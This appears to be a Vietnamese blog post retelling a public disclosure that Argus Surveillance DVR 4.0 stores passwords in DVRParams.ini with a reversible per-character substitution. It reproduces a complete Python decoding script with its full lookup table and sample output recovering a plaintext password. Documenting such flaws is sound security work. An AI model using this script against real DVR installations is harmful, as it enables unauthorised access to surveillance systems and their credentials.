---
title: Bẻ khóa mật khẩu ứng dụng giám sát camera Argus
date: 19/7/2021
layout: single
header:
  teaser: /assets/images/crack.jpg
---
## Mô Tả 
Trong một lần gần đây nhất, tôi đã xem `Argus Surveillance DVR 4.0` đang sử dụng mã hóa yếu cho mật khẩu.

+ Phiên bản:  Argus Surveillance DVR 4.0
+ Tác giả: Salman Asad (@deathflash1411)
+ Thử nghiệm: Windows 7 x86 (Build 7601) & Windows 10

## Khai thác  
Argus Surveillance DVR 4.0 đang lưu trữ cấu hình trong một tệp có tên `DVRParams.ini`nằm trong
 `C:\ProgramData\PY_Software\Argus Surveillance DVR`


![location](https://i.imgur.com/KYcjQOM.png)

Đã tạo một tài khoản thử nghiệm với tên người dùng `test` và mật khẩu `test`

![users](https://i.imgur.com/cbwtBsN.png)

Cấu hình đang lưu trữ mật khẩu của người dùng dưới dạng băm


![hash](https://i.imgur.com/d1PnFsd.png)

Một điều thú vị  là bốn ký tự đầu tiên và bốn ký tự cuối cùng trong mã băm giống nhau `E03B` vì mật khẩu của tác giả đã kiểm tra trong đó ký tự đầu tiên và ký tự cuối cùng giống nhau` t`

Điều này xác nhận rằng `t = E03B`, tôi đã giả định rằng mỗi ký tự trong mật khẩu có 4 ký tự trong hàm băm 34

![test](https://i.imgur.com/cZhNqwc.png)

Thật thú vị, hãy đổi mật khẩu thành `1234567890` (10 ký tự)

![change_pass](https://i.imgur.com/trhdvQE.png)

Đây là mật khẩu băm mới trong `DVRParams.ini`

![new_pass](https://i.imgur.com/NM50Tbq.png)

Giả định của tôi là đúng vì hàm băm mật khẩu dài chính xác 40 ký tự (10 * 4) 46

Tương tự, tác giả  đã thay đổi mật khẩu thành `abc ... xyz` và` ABC ... XYZ` và ghi chú lại các giá trị cho từng ký tự

Dựa trên những phát hiện ở trên, tác giả  đã viết một đoạn mã đơn giản để giải mã hàm băm mật khẩu 50

Mã khai thác: [exploits/50130](https://www.exploit-db.com/exploits/50130)

```python
characters = {
'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
'8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
'7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
'8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y','C9C4':'Z',
'F641':'a','6C6A':'b','D9BD':'c','418D':'d','B740':'e',
'E1D0':'f','3CD9':'g','956B':'h','C875':'i','696C':'j',
'906B':'k','3F7E':'l','4D7B':'m','EB60':'n','8998':'o',
'7196':'p','B657':'q','CA79':'r','9083':'s','E03B':'t',
'AAFE':'u','F787':'v','C165':'w','A935':'x','B734':'y','E4BC':'z'}

pass_hash = "418DB740F641E03B956BE1D03F7EF6419083956BECB453D1ECB4ECB4"
if (len(pass_hash)%4) != 0:
    print("[!] Error, check your password hash")
    exit()
split = []
n = 4
for index in range(0, len(pass_hash), n):
    split.append(pass_hash[index : index + n])

for key in split:
    if key in characters.keys():
        print("[+] " + key + ":" + characters[key])
    else:
        print("[-] " + key + ":Unknown")

```
```powershell
#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] 418D:d
[+] B740:e
[+] F641:a
[+] E03B:t
[+] 956B:h
[+] E1D0:f
[+] 3F7E:l
[+] F641:a
[+] 9083:s
[+] 956B:h
[+] ECB4:1
[+] 53D1:4
[+] ECB4:1
[+] ECB4:1

```

Lưu ý: thay thế giá trị của `pass_hash`trong tập lệnh bằng mã băm mật khẩu bạn lấy được từ `DVRParams.in`

## Cảm Ơn :D


